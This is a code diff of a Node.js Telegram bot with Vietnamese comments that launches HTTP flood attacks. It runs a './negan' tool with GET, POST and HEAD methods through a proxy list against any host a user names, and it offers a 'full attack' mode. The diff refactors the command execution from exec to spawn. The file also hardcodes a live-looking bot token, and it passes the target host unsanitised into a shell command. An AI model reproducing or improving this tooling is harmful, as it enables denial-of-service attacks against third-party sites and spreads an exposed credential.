@@ -1,5 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api'),
-    { exec } = require('child_process'),
+    { spawn } = require('child_process'), // Sử dụng spawn thay vì exec
     token = '7935173392:AAEtnVDLZ0VxFCBhFZAHu-FeMgP_x3_O-jw',
     adminId = 7371969470,
     allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, 998877665]),
@@ -87,23 +87,13 @@ const initBot = () => {
 
             // Chạy lệnh tùy thuộc vào phương thức
             if (isFullAttack) {
-                // Chạy đồng thời 3 lệnh exec với các phương thức HTTP khác nhau
-                exec(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
-                    handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
-                });
-
-                exec(`${nodeOptions} node ./negan -m POST -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
-                    handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
-                });
-
-                exec(`${nodeOptions} node ./negan -m HEAD -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
-                    handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
-                });
+                // Chạy đồng thời 3 lệnh spawn với các phương thức HTTP khác nhau
+                runCommand(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
+                runCommand(`${nodeOptions} node ./negan -m POST -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
+                runCommand(`${nodeOptions} node ./negan -m HEAD -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
             } else {
                 // Chỉ chạy phương thức GET
-                exec(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
-                    handleCommandCompletion(e, stdout, stderr, pid, userId, chatId, caller, host, attackTime);
-                });
+                runCommand(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
             }
 
             return;
@@ -119,6 +109,20 @@ const initBot = () => {
     bot.on('polling_error', restartBot);
     process.on('uncaughtException', restartBot);
     process.on('unhandledRejection', restartBot);
+};
+
+const runCommand = (command, pid, userId, chatId, caller, host, attackTime) => {
+    const child = spawn(command, { shell: true });
+
+    child.on('close', (code) => {
+        console.log(`Lệnh ${command} đã kết thúc với mã ${code}`);
+        handleCommandCompletion(null, null, null, pid, userId, chatId, caller, host, attackTime);
+    });
+
+    child.on('error', (err) => {
+        console.error(`Lỗi khi chạy lệnh ${command}:`, err);
+        handleCommandCompletion(err, null, null, pid, userId, chatId, caller, host, attackTime);
+    });
 };
 
 const handleCommandCompletion = (e, stdout, stderr, pid, userId, chatId, caller, host, attackTime) => {
